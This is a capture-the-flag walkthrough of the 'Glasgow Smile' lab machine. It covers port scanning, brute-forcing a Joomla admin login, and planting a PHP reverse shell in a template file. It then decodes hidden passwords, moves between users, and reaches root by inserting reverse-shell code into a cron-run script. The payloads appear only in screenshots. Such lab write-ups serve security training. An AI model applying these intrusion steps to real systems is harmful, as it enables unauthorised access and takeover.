---
categories: [Proving Grounds Play]
tags: [PrivEsc]
---

Lets check the IP address of this Victim machine →

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled.png)

```bash
IP : 192.168.249.134
```

## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Glasglow]
└─$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 192.168.249.134                                              
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-05 00:38 EDT
Nmap scan report for 192.168.249.134
Host is up (0.00055s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6734481f250ed7b3eabb361122608fa1 (RSA)
|   256 4c8c4565a484e8b1507777a93a960631 (ECDSA)
|_  256 09e994236097f720cceed6c19bda188e (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site does not have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 00:0C:29:E0:E5:1E (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration ⤵️

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%201.png)

while Directory Traversal I got these directories →

```bash
┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Glasglow]
└─$ cat ferox_80.txt                                                                                                       1 ⚙
200      GET        8l       11w      125c http://192.168.249.134/
200      GET        8l       11w      125c http://192.168.249.134/index.html
301      GET        9l       28w      319c http://192.168.249.134/joomla => http://192.168.249.134/joomla/
301      GET        9l       28w      326c http://192.168.249.134/joomla/images => http://192.168.249.134/joomla/images/
301      GET        9l       28w      327c http://192.168.249.134/joomla/modules => http://192.168.249.134/joomla/modules/
301      GET        9l       28w      325c http://192.168.249.134/joomla/media => http://192.168.249.134/joomla/media/
301      GET        9l       28w      329c http://192.168.249.134/joomla/templates => http://192.168.249.134/joomla/templates/
301      GET        9l       28w      323c http://192.168.249.134/joomla/bin => http://192.168.249.134/joomla/bin/
301      GET        9l       28w      327c http://192.168.249.134/joomla/plugins => http://192.168.249.134/joomla/plugins/
301      GET        9l       28w      328c http://192.168.249.134/joomla/includes => http://192.168.249.134/joomla/includes/
301      GET        9l       28w      328c http://192.168.249.134/joomla/language => http://192.168.249.134/joomla/language/
200      GET       72l      540w     4874c http://192.168.249.134/joomla/README.txt
301      GET        9l       28w      330c http://192.168.249.134/joomla/components => http://192.168.249.134/joomla/components/
301      GET        9l       28w      325c http://192.168.249.134/joomla/cache => http://192.168.249.134/joomla/cache/
301      GET        9l       28w      329c http://192.168.249.134/joomla/libraries => http://192.168.249.134/joomla/libraries/
200      GET       32l      111w      836c http://192.168.249.134/joomla/robots.txt
301      GET        9l       28w      323c http://192.168.249.134/joomla/tmp => http://192.168.249.134/joomla/tmp/
200      GET      339l     2968w    18092c http://192.168.249.134/joomla/LICENSE.txt
301      GET        9l       28w      327c http://192.168.249.134/joomla/layouts => http://192.168.249.134/joomla/layouts/
301      GET        9l       28w      333c http://192.168.249.134/joomla/administrator => http://192.168.249.134/joomla/administrator/
200      GET        0l        0w        0c http://192.168.249.134/joomla/configuration.php
200      GET       16l       96w      456c http://192.168.249.134/how_to.txt
200      GET       80l      493w     3005c http://192.168.249.134/joomla/htaccess.txt
301      GET        9l       28w      323c http://192.168.249.134/joomla/cli => http://192.168.249.134/joomla/cli/
```

Since it contains CMS as joomla so lets enumerate accordingly —>

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%202.png)

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%203.png)

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%204.png)

So I have `Joomla! 3.7 version` ➡️

Now lets login brute force this site ⤵️

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%205.png)

Now lets create a wordlists with cewl tool from the joomla web page ➡️

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%206.png)

Lets brute force this site using burpsuite and take username as `joomla` ⬇️

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%207.png)

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%208.png)

Now I got the password as `Gotham` , Lets login ➡️

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%209.png)

Now lets uplaod the reverse shell php code into Templates > Beez3 Details and Files > error.php ⬇️

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2010.png)

URL to load the reverse shell -> `http://192.168.249.134/joomla/templates/beez3/error.php`

In response to that I got my reverse shell →

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2011.png)

Now lets look into `configuration.php` file ➡️

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2012.png)

```bash
joomla : babyjoker
```

Lets look into the mysql database —>

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2013.png)

I got rob as a user also so lets decode this encrypted value to get the password ⬇️

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2014.png)

```bash
Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/	:	???AllIHaveAreNegativeThoughts???
```

Now its rob time →

```bash
www-data@glasgowsmile:/opt$ su rob
Password: 
rob@glasgowsmile:/opt$ whoami
rob
rob@glasgowsmile:/opt$
rob@glasgowsmile:~$ cat user.txt
JKR[f5bb11acbb957915e421d62e7253d27a]
rob@glasgowsmile:~$
rob@glasgowsmile:~$ cat howtoberoot 
  _____ ______   __  _   _    _    ____  ____  _____ ____  
 |_   _|  _ \ \ / / | | | |  / \  |  _ \|  _ \| ____|  _ \ 
   | | | |_) \ V /  | |_| | / _ \ | |_) | | | |  _| | |_) |
   | | |  _ < | |   |  _  |/ ___ \|  _ <| |_| | |___|  _ < 
   |_| |_| \_\|_|   |_| |_/_/   \_\_| \_\____/|_____|_| \_\

NO HINTS.

rob@glasgowsmile:~$
rob@glasgowsmile:~$ cat Abnerineedyourhelp 
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm is."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
rob@glasgowsmile:~$

```

Now I have to use a vigenere decode with key Z to decode this ⬆️ string .

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2015.png)

```bash
Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you do not."
Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==

Lets decode this password which is base64 encoded >

┌──(kali㉿kali)-[~/Downloads/Proving_Ground/Glasglow]
└─$ echo "STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==" | base64 -d
I33hope99my0death000makes44more8cents00than0my0life0
```

Now It abner shell time ➡️

```bash
abner@glasgowsmile:~$ whoami
abner
abner@glasgowsmile:~$ ls -al
total 44
drwxr-xr-x 4 abner abner 4096 Jun 16  2020 .
drwxr-xr-x 5 root  root  4096 Jun 15  2020 ..
-rw------- 1 abner abner  167 May  4 23:35 .bash_history
-rw-r--r-- 1 abner abner  220 Jun 14  2020 .bash_logout
-rw-r--r-- 1 abner abner 3526 Jun 14  2020 .bashrc
-rw-r----- 1 abner abner  565 Jun 16  2020 info.txt
drwxr-xr-x 3 abner abner 4096 Jun 14  2020 .local
-rw-r--r-- 1 abner abner  807 Jun 14  2020 .profile
drwx------ 2 abner abner 4096 Jun 15  2020 .ssh
-rw-r----- 1 abner abner   38 Jun 16  2020 user2.txt
-rw------- 1 abner abner  399 Jun 15  2020 .Xauthority
abner@glasgowsmile:~$ cat user2.txt 
JKR{0286c47edc9bfdaf643f5976a8cfbd8d}
abner@glasgowsmile:~$
```

After so much try I got this file >>
`/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip`

```bash

abner@glasgowsmile:/var/www/joomla2/administrator/manifests/files$ ls -al
total 16
drwxr-xr-x 2 root  root  4096 Jun 16  2020 .
drwxr-xr-x 5 root  root  4096 Jun 16  2020 ..
-rwxr-xr-x 1 abner abner  516 Jun 16  2020 .dear_penguins.zip
-rwxr-xr-x 1 root  root  1796 Jun 16  2020 joomla.xml

```

Transfered into the /tmp >>

And I used the password of abner to unzip that file ➡️

```bash

abner@glasgowsmile:/var/www/joomla2/administrator/manifests/files$ cp .dear_penguins.zip /tmp
abner@glasgowsmile:/var/www/joomla2/administrator/manifests/files$ cd /tmp
abner@glasgowsmile:/tmp$ unzip .dear_penguins.zip 
Archive:  .dear_penguins.zip
[.dear_penguins.zip] dear_penguins password: (I33hope99my0death000makes44more8cents00than0my0life0)
  inflating: dear_penguins           
abner@glasgowsmile:/tmp$
abner@glasgowsmile:/tmp$ ls
dear_penguins  pspy64
abner@glasgowsmile:/tmp$
abner@glasgowsmile:/tmp$ cat dear_penguins 
My dear penguins, we stand on a great threshold! It is okay to be scared; many of you would not be coming back. Thanks to Batman, the time has come to punish all of God is children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
abner@glasgowsmile:/tmp$
abner@glasgowsmile:/tmp$ su penguin
Password: 
penguin@glasgowsmile:/tmp$ cd ~
penguin@glasgowsmile:~$ ls
SomeoneWhoHidesBehindAMask
penguin@glasgowsmile:~$ cd SomeoneWhoHidesBehindAMask/
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -al
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
-rwSr----- 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat user3.txt
JKR{284a3753ec11a592ee34098b8cb43d52}
```

Now With pspy64 I got to know about the cron activity thorougly →

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2016.png)

So lets see what this machine is running behind my back →

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2017.png)

Now lets alter into `.trash_old` file so that I can have a root user ⤵️

```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat .trash_old 
#!/bin/sh
#
#       (            (              )            (      *    (   (
# (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )
# )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (
#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\
# /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)
#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|
#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|
#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|
#

#

 
exit 0

Now lets add a reverse shell code to get to root ->
```

After adding the shell code ➡️

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2018.png)

In to response I got this ⬇️

![Untitled](/Vulnhub-Files/img/Glassglow/Untitled%2019.png)

```bash
# cat root.txt
  ▄████ ██▓   ▄▄▄       ██████  ▄████ ▒█████  █     █░     ██████ ███▄ ▄███▓██▓██▓   ▓█████ 
 ██▒ ▀█▓██▒  ▒████▄   ▒██    ▒ ██▒ ▀█▒██▒  ██▓█░ █ ░█░   ▒██    ▒▓██▒▀█▀ ██▓██▓██▒   ▓█   ▀ 
▒██░▄▄▄▒██░  ▒██  ▀█▄ ░ ▓██▄  ▒██░▄▄▄▒██░  ██▒█░ █ ░█    ░ ▓██▄  ▓██    ▓██▒██▒██░   ▒███   
░▓█  ██▒██░  ░██▄▄▄▄██  ▒   ██░▓█  ██▒██   ██░█░ █ ░█      ▒   ██▒██    ▒██░██▒██░   ▒▓█  ▄ 
░▒▓███▀░██████▓█   ▓██▒██████▒░▒▓███▀░ ████▓▒░░██▒██▓    ▒██████▒▒██▒   ░██░██░██████░▒████▒
 ░▒   ▒░ ▒░▓  ▒▒   ▓▒█▒ ▒▓▒ ▒ ░░▒   ▒░ ▒░▒░▒░░ ▓░▒ ▒     ▒ ▒▓▒ ▒ ░ ▒░   ░  ░▓ ░ ▒░▓  ░░ ▒░ ░
  ░   ░░ ░ ▒  ░▒   ▒▒ ░ ░▒  ░ ░ ░   ░  ░ ▒ ▒░  ▒ ░ ░     ░ ░▒  ░ ░  ░      ░▒ ░ ░ ▒  ░░ ░  ░
░ ░   ░  ░ ░   ░   ▒  ░  ░  ░ ░ ░   ░░ ░ ░ ▒   ░   ░     ░  ░  ░ ░      ░   ▒ ░ ░ ░     ░   
      ░    ░  ░    ░  ░     ░       ░    ░ ░     ░             ░        ░   ░     ░  ░  ░  ░

Congratulations!

You've got the Glasgow Smile!

JKR{68028b11a1b7d56c521a90fc18252995}

Credits by

mindsflee
#
```